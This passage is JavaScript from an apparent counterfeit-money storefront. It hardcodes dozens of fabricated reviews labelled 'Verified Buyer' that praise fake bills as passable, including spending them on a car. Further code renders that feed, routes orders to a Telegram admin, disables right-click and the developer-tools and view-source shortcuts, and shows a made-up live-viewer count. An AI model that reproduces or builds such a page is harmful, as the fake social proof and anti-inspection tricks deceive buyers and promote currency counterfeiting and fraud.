        status: "Package Delivered & Received",
        comment: "They also good ah for money spreads lan go cap I be flexing on my gram wit ya shit ⛹️."
    },
    {
        id: "ORD-410981",
        username: "@loyal_shopper99",
        rating: 4,
        timestamp: "2026-08-30T08:45:00Z",
        status: "Package Delivered & Received",
        comment: "i got some new 12s off them hoes twin."
    },
    {
        id: "ORD-410772",
        username: "@dreezy_fan",
        rating: 5,
        timestamp: "2026-08-30T07:55:00Z",
        status: "Package Delivered & Received",
        comment: "Went moissanite Ap off the counterfeit 20s 😂"
    },
    {
        id: "ORD-410502",
        username: "@k9_hustle",
        rating: 4,
        timestamp: "2026-08-30T07:10:00Z",
        status: "Package Delivered & Received",
        comment: "Pa I'm from the M and this my 2nd go round using your prop money for a car, this a 2012 g37 I just scored not even 2 hours ago off your shit You the one pa on Allah."
    },
    {
        id: "ORD-410112",
        username: "@impatient_dev",
        rating: 5,
        timestamp: "2026-08-30T04:20:00Z",
        status: "Package Delivered & Received",
        comment: "U valid igl them tiktok niggas be hating on U but I see ts real deal I gotta give u yo credit tappin in again when I flip dese bitches watch"
    },
    {
        id: "ORD-409990",
        username: "@crypto_whale_22",
        rating: 4,
        timestamp: "2026-08-30T01:10:00Z",
        status: "Package Delivered & Received",
        comment: "went straight to marketplace ya shit already came up a $600 steering wheel day1 My goal is to make my first 20k keep flipping the props and reinvesting with u kuh"
    },

    // --- AUGUST 29, 2026 ---
    {
        id: "ORD-409811",
        username: "@skibidi_coder",
        rating: 5,
        timestamp: "2026-08-29T22:10:00Z",
        status: "Package Delivered & Received",
        comment: "That new voucher method is actually clutch for people with only Apple Pay and card. Smooth af.."
    },
    {
        id: "ORD-408912",
        username: "@no_coupon_club",
        rating: 5,
        timestamp: "2026-08-29T20:40:00Z",
        status: "Package Delivered & Received",
        comment: "Product quality valid fr, just needs a lil aging and it’s perfect."
    },
    {
        id: "ORD-407882",
        username: "@repeat_buyer_gz",
        rating: 5,
        timestamp: "2026-08-29T19:05:00Z",
        status: "Package Delivered & Received",
        comment: "Lowkey didn’t think the card voucher thing would work but bet, whole process was easy."
    },
    {
        id: "ORD-405321",
        username: "@drippy_jay",
        rating: 5,
        timestamp: "2026-08-29T17:40:00Z",
        status: "Package Delivered & Received",
        comment: "USPS really locked in this time. Arrived quicker than my last purchase 😂"
    },
    {
        id: "ORD-403210",
        username: "@local_courier_hater",
        rating: 4,
        timestamp: "2026-08-29T15:30:00Z",
        status: "Package Delivered & Received",
        comment: "Quality clean, just gotta let it age a tiny bit more but still solid"
    },
    {
        id: "ORD-401928",
        username: "@crypto_bro_420",
        rating: 5,
        timestamp: "2026-08-29T14:15:00Z",
        status: "Package Delivered & Received",
        comment: "Customer support was chill and USPS came through faster than expected."
    },
    {
        id: "ORD-398710",
        username: "@no_discount_dave",
        rating: 5,
        timestamp: "2026-08-29T11:20:00Z",
        status: "Package Delivered & Received",
        comment: "Quality is legit, no complaints there. Just wish y'all threw in discounts for repeat customers. I'm practically paying your rent at this point lol."
    },
    {
        id: "ORD-395102",
        username: "@phantom_flick",
        rating: 3,
        timestamp: "2026-08-29T08:50:00Z",
        status: "Package Delivered & Received",
        comment: "Apple Pay users finally eating 😭 voucher checkout made everything easy."
    },

    // --- AUGUST 28, 2026 ---
    {
        id: "ORD-387219",
        username: "@cyber_trapper",
        rating: 5,
        timestamp: "2026-08-28T19:30:00Z",
        status: "Package Delivered & Received",
        comment: "Second order hit different. Shipping speed upgraded crazy compared to before."
    },
    {
        id: "ORD-383410",
        username: "@vancouver_shopper",
        rating: 4,
        timestamp: "2026-08-28T17:45:00Z",
        status: "Package Delivered & Received",
        comment: "Product feels premium ngl, just needs a lil more aging and we good."
    },
    {
        id: "ORD-381002",
        username: "@zero_chill_99",
        rating: 4,
        timestamp: "2026-08-28T16:00:00Z",
        status: "Package Delivered & Received",
        comment: "Voucher payments lowkey the best update y’all added. Way easier for card users."
    },
    {
        id: "ORD-376102",
        username: "@phantom_plug",
        rating: 5,
        timestamp: "2026-08-28T14:50:00Z",
        status: "Package Delivered & Received",
        comment: "good quality, fine, I'mma give an instant 5 stars fam 😭"
    },
    {
        id: "ORD-369120",
        username: "@vip_member_when",
        rating: 5,
        timestamp: "2026-08-28T12:10:00Z",
        status: "Package Delivered & Received",
        comment: "The voucher payment method was a lifesaver. Highly recommend."
    },
    {
        id: "ORD-365912",
        username: "@atl_regular",
        rating: 4,
        timestamp: "2026-08-28T09:15:00Z",
        status: "Package Delivered & Received",
        comment: "Best customer support I've interacted with on Telegram."
    },

    // --- AUGUST 27, 2026 ---
    {
        id: "ORD-354091",
        username: "@sol_strider",
        rating: 5,
        timestamp: "2026-08-27T21:40:00Z",
        status: "Package Delivered & Received",
        comment: "Will I get a discount if I keep purchasing."
    },
    {
        id: "ORD-349012",
        username: "@late_post_guy",
        rating: 3,
        timestamp: "2026-08-27T18:55:00Z",
        status: "Package Delivered & Received",
        comment: "don't know why my delivery was late, I like the bills tho"
    },
    {
        id: "ORD-343201",
        username: "@lowkey_dev",
        rating: 4,
        timestamp: "2026-08-27T16:20:00Z",
        status: "Package Delivered & Received",
        comment: "Lowkey was nervous buying this off a site but te texture is actually kinda rel ngl."
    },
    {
        id: "ORD-339012",
        username: "@frequent_flyer",
        rating: 4,
        timestamp: "2026-08-27T12:05:00Z",
        status: "Package Delivered & Received",
        comment: "Exceeded expectations honestly. they just hating on you cash"
    },
    {
        id: "ORD-335190",
        username: "@blade_runner_26",
        rating: 3,
        timestamp: "2026-08-27T08:30:00Z",
        status: "Package Delivered & Received",
        comment: "A bit delayed by the local courier by 1 day but the item itself is hard."
    },

    // --- AUGUST 26, 2026 ---
    {
        id: "ORD-332190",
        username: "@big_bag_99",
        rating: 5,
        timestamp: "2026-08-26T20:05:00Z",
        status: "Package Delivered & Received",
        comment: "W customer service."
    },
    {
        id: "ORD-328901",
        username: "@slung_master",
        rating: 4,
        timestamp: "2026-08-26T17:40:00Z",
        status: "Package Delivered & Received",
        comment: "Not bad, just minor delays."
    },
    {
        id: "ORD-321089",
        username: "@npc_energy",
        rating: 2,
        timestamp: "2026-08-26T15:30:00Z",
        status: "Package Delivered & Received",
        comment: "Slight delay killed my schedule."
    },
    {
        id: "ORD-318901",
        username: "@charlotte_vibe",
        rating: 5,
        timestamp: "2026-08-26T11:45:00Z",
        status: "Package Delivered & Received",
        comment: "Valid as hell. Already told my boys about this page."
    },
    {
        id: "ORD-314320",
        username: "@bulk_buyer_99",
        rating: 3,
        timestamp: "2026-08-26T08:15:00Z",
        status: "Package Delivered & Received",
        comment: "Giving 3 stars because I keep spending high amounts here without any loyalty discount or sum broo 😭😭."
    },

    // --- AUGUST 25, 2026 ---
    {
        id: "ORD-310978",
        username: "@yung_crypto",
        rating: 5,
        timestamp: "2026-08-25T18:10:00Z",
        status: "Package Delivered & Received",
        comment: "didn't know they sctuslly passable😤"
    },
    {
        id: "ORD-304120",
        username: "@tracking_checker",
        rating: 5,
        timestamp: "2026-08-25T14:25:00Z",
        status: "Package Delivered & Received",
        comment: "the bills actually unfold even when I fold em, that's crazy ngl"
    },
    {
        id: "ORD-298756",
        username: "@pixel_gz",
        rating: 5,
        timestamp: "2026-08-25T12:00:00Z",
        status: "Package Delivered & Received",
        comment: "Decent, just needs faster turnaround."
    },

    // --- AUGUST 24, 2026 ---
    {
        id: "ORD-287645",
        username: "@day_one_fan",
        rating: 2,
        timestamp: "2026-08-24T23:15:00Z",
        status: "Package Delivered & Received",
        comment: "I don get why they hating on you on tiktok, bro the texture feels so fucking real"
    },
    {
        id: "ORD-281092",
        username: "@la_film_crew2",
        rating: 4,
        timestamp: "2026-08-24T19:50:00Z",
        status: "Package Delivered & Received",
        comment: "Yall should give it a try"
    },
    {
        id: "ORD-276534",
        username: "@tx_bandit",
        rating: 5,
        timestamp: "2026-08-24T17:10:00Z",
        status: "Package Delivered & Received",
        comment: "I'm abouta excape the rat race with this shih ngl😂"
    },

    // --- AUGUST 22 - 23, 2026 ---
    {
        id: "ORD-265423",
        username: "@metro_boomin_fan",
        rating: 3,
        timestamp: "2026-08-23T19:25:00Z",
        status: "Package Delivered & Received",
        comment: "Quality is good. Took an extra day on transit though."
    },
    {
        id: "ORD-254312",
        username: "@shadow_fx",
        rating: 5,
        timestamp: "2026-08-23T14:40:00Z",
        status: "Package Delivered & Received",
        comment: "Almost forgot I ordered,"
    },
    {
        id: "ORD-994071",
        username: "@amira.wav",
        rating: 5,
        timestamp: "2026-08-22T14:30:00Z", 
        status: "Package Delivered & Received",
        comment: "Never stop selling bro, this is genuinely a loop hole in the system..lol"
    },
    {
        id: "ORD-165430",
        username: "@hidden_dem",
        rating: 5,
        timestamp: "2026-08-22T11:20:00Z", 
        status: "Package Delivered & Received",
        comment: "Bad product....siike, I'mma give it 5 star, def comming for more"
    },

    // --- AUGUST 20 - 21, 2026 ---
    {
        id: "ORD-984094",
        username: "@lilcodec22",
        rating: 5,
        timestamp: "2026-08-20T14:30:00Z",
        status: "Package Delivered & Received",
        comment: "Pa I'm from the M and this my 2nd go round using your prop money for a car, this a 2012 g37 I just scored not even 2 hours ago off your shit You the one pa on Allah."
    },
    {
        id: "ORD-982134",
        username: "@tx_runner",
        rating: 5,
        timestamp: "2026-08-20T11:15:00Z",
        status: "Package Delivered & Received",
        comment: "Just saw this shi on tiktok, didn't know yu actually deliver"
    },

    // --- AUGUST 15 - 19, 2026 ---
    {
        id: "ORD-968210",
        username: "@dreezy_99",
        rating: 5,
        timestamp: "2026-08-18T16:05:00Z",
        status: "Package Delivered & Received",
        comment: "genuinely have no regrets "
    },
    {
        id: "ORD-849201",
        username: "@crypto_king99",
        rating: 5,
        timestamp: "2026-08-17T09:15:00Z",
        status: "Package Delivered & Received",
        comment: "Payment via SOL went through smoothly. Tracking updated in under 20 mins and item arrived exactly as described."
    },
    {
        id: "ORD-832109",
        username: "@devin_plug",
        rating: 5,
        timestamp: "2026-08-16T21:40:00Z",
        status: "Package Delivered & Received",
        comment: "This shit is addictive once you buy once 😭😭"
    },
    {
        id: "ORD-710293",
        username: "@bay_buyer",
        rating: 5,
        timestamp: "2026-08-15T18:45:00Z",
        status: "Package Delivered & Received",
        comment: "Hire me bro, I wanna learn how to make them this good, shi actually usable"
    },

    // --- AUGUST 01 - 14, 2026 ---
    {
        id: "ORD-708912",
        username: "@k_hustle",
        rating: 5,
        timestamp: "2026-08-14T13:10:00Z",
        status: "Package Delivered & Received",
        comment: "I was genuinely ready to lose my 50, turns out you actually deliver"
    },
    {
        id: "ORD-682104",
        username: "@atl_trapper",
        rating: 5,
        timestamp: "2026-08-12T15:25:00Z",
        status: "Package Delivered & Received",
        comment: "yo, can you train me how to make this bro, shi feels real asf"
    },
    {
        id: "ORD-602911",
        username: "@sara_m_22",
        rating: 4,
        timestamp: "2026-08-08T11:20:00Z",
        status: "Package Delivered & Received",
        comment: "yo, no way they're actually usable fam"
    },
    {
        id: "ORD-591230",
        username: "@chief_keef_fan",
        rating: 5,
        timestamp: "2026-08-07T14:05:00Z",
        status: "Package Delivered & Received",
        comment: "i actually like this shi"
    },
    {
        id: "ORD-574920",
        username: "@nova_prints",
        rating: 5,
        timestamp: "2026-08-05T16:30:00Z",
        status: "Package Delivered & Received",
        comment: "Pretty good experience overall."
    },
    {
        id: "ORD-519284",
        username: "@alpha_trader",
        rating: 5,
        timestamp: "2026-08-01T16:00:00Z",
        status: "Package Delivered & Received",
        comment: "It’s okay. Nothing crazy but works..."
    },

    // --- JULY 2026 REVIEWS ---
    {
        id: "ORD-498210",
        username: "@ghost_rider",
        rating: 5,
        timestamp: "2026-07-31T11:05:00Z",
        status: "Package Delivered & Received",
        comment: "Shih was so good I thought it was an empty box at first lol. 10/10."
    },
    {
        id: "ORD-487109",
        username: "@vancouver_plug",
        rating: 5,
        timestamp: "2026-07-29T18:30:00Z",
        status: "Package Delivered & Received",
        comment: "They just hating on you on tiktok, your shih valid ngl"
    },
    {
        id: "ORD-476201",
        username: "@rich_mindset",
        rating: 5,
        timestamp: "2026-07-28T15:15:00Z",
        status: "Package Delivered & Received",
        comment: "I wanna gate keep this soo bad bro 😭"
    },
    {
        id: "ORD-465102",
        username: "@la_film_crew",
        rating: 5,
        timestamp: "2026-07-26T12:40:00Z",
        status: "Package Delivered & Received",
        comment: "wish I knew this way before, been missing alot"
    },
    {
        id: "ORD-454091",
        username: "@sammy_g",
        rating: 4,
        timestamp: "2026-07-24T09:25:00Z",
        status: "Package Delivered & Received",
        comment: "Y'all been gate keeping this????"
    },
    {
        id: "ORD-443102",
        username: "@chicago_drill",
        rating: 5,
        timestamp: "2026-07-22T17:10:00Z",
        status: "Package Delivered & Received",
        comment: "no stupid ahh delays."
    },
    {
        id: "ORD-432091",
        username: "@silent_partner",
        rating: 5,
        timestamp: "2026-07-20T14:00:00Z",
        status: "Package Delivered & Received",
        comment: "I genuinely don't get why they hate on you on tiktok, shih feels real ngl"
    },
    {
        id: "ORD-421082",
        username: "@philly_express",
        rating: 5,
        timestamp: "2026-07-18T10:30:00Z",
        status: "Package Delivered & Received",
        comment: "Why Am I the first one to review 😭😭"
    }
];

function getRelativeTime(timestamp) {
    const now = new Date();
    const past = new Date(timestamp);
    const diffInSeconds = Math.floor((now - past) / 1000);

    if (diffInSeconds < 60) return "Just now";

    const minutes = Math.floor(diffInSeconds / 60);
    if (minutes < 60) return `${minutes} ${minutes === 1 ? 'minute' : 'minutes'} ago`;

    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `${hours} ${hours === 1 ? 'hour' : 'hours'} ago`;

    const days = Math.floor(hours / 24);
    if (days < 7) return `${days} ${days === 1 ? 'day' : 'days'} ago`;

    const weeks = Math.floor(days / 7);
    if (weeks < 4) return `${weeks} ${weeks === 1 ? 'week' : 'weeks'} ago`;

    const months = Math.floor(days / 30);
    if (months < 12) return `${months} ${months === 1 ? 'month' : 'months'} ago`;

    const years = Math.floor(days / 365);
    return `${years} ${years === 1 ? 'year' : 'years'} ago`;
}

function getStarString(rating) {
    const fullStar = "★";
    const emptyStar = "☆";
    return fullStar.repeat(rating) + emptyStar.repeat(5 - rating);
}

function renderReviewsFeed() {
    const container = document.getElementById('reviews-feed');
    if (!container) return;

    let html = "";

    mockReviews.forEach(rev => {
        const initial = rev.username.replace('@', '').charAt(0).toUpperCase();
        const relativeDate = getRelativeTime(rev.timestamp);

        html += `
            <div class="card-box review-card" style="background: #0f172a; border: 1px solid #334155; padding: 18px; border-radius: 10px; margin-bottom: 16px;">
                <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 12px;">
                    <div style="display: flex; align-items: center; gap: 10px;">
                        <div style="width: 38px; height: 38px; border-radius: 50%; background: #1e293b; border: 1px solid #38bdf8; display: flex; align-items: center; justify-content: center; color: #38bdf8; font-weight: 700; font-size: 0.95rem;">
                            ${initial}
                        </div>
                        <div>
                            <strong style="color: #f8fafc; font-size: 0.95rem; display: block;">${rev.username}</strong>
                            <span style="color: #22c55e; font-size: 0.75rem; font-weight: 600;">☑ Verified Buyer (${rev.id})</span>
                        </div>
                    </div>
                    <span style="color: #64748b; font-size: 0.75rem;">${relativeDate}</span>
                </div>

                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 10px;">
                    <span style="color: #fbbf24; font-size: 1rem; letter-spacing: 1px;">${getStarString(rev.rating)}</span>
                    <span style="background: rgba(34, 197, 94, 0.1); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.2); font-size: 0.7rem; padding: 2px 6px; border-radius: 4px;">
                        ${rev.status}
                    </span>
                </div>

                <p style="color: #cbd5e1; font-size: 0.875rem; line-height: 1.5; margin: 0;">
                    "${rev.comment}"
                </p>
            </div>
        `;
    });

    container.innerHTML = html;
}

function sendOrderToTelegram() {
    const orderId = document.getElementById('conf-order-id')?.innerText?.replace('#', '').trim() || 'N/A';
    const total = document.getElementById('conf-total-amount')?.innerText?.trim() || 'N/A';
    const paymentMethod = document.getElementById('conf-pay-method')?.innerText?.trim() || 'GiftMeCrypto Voucher';

    const message = `Hello Admin! I have completed my order:\n\nOrder ID: ${orderId}\nTotal: ${total}\nPayment Method: ${paymentMethod}\n\nPlease confirm shipment.`;
    
    const telegramUrl = `https://t.me/realrichoffdebits?text=${encodeURIComponent(message)}`;
    window.open(telegramUrl, '_blank');
}

window.onload = init;

document.addEventListener('contextmenu', (e) => e.preventDefault());

document.addEventListener('keydown', (e) => {
    if (e.key === 'F12' || e.keyCode === 123) {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) {
        e.preventDefault();
        return false;
    }
    if (e.metaKey && e.altKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) {
        e.preventDefault();
        return false;
    }
    if ((e.ctrlKey || e.metaKey) && (e.key === 'U' || e.key === 'u')) {
        e.preventDefault();
        return false;
    }
});

(function updateLiveViewers() {
    setInterval(() => {
        const viewerElem = document.getElementById('floating-viewers');
        if (!viewerElem) return;

        let count = parseInt(viewerElem.innerText, 10);
        if (isNaN(count)) count = 19;

        const delta = Math.floor(Math.random() * 5) - 2; 
        count = Math.max(14, Math.min(28, count + delta));

        viewerElem.innerText = count;
    }, 4000);
})();
